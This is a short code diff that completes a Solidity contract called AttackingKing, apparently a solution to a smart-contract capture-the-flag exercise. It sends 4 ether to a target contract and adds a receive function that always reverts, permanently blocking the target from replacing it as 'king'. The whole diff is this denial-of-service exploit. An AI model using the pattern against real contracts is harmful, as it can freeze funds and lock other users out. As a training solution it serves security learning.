@@ -10,7 +10,11 @@ contract AttackingKing {
         contractAddress = _contractAddress;
     }
 
+    receive() external payable {
+      revert('I will be the king forever.');
+    }
+
     function hackContract() external {
-        // Code me!
+      payable(contractAddress).call{value:  4 ether}("");
     }
 }
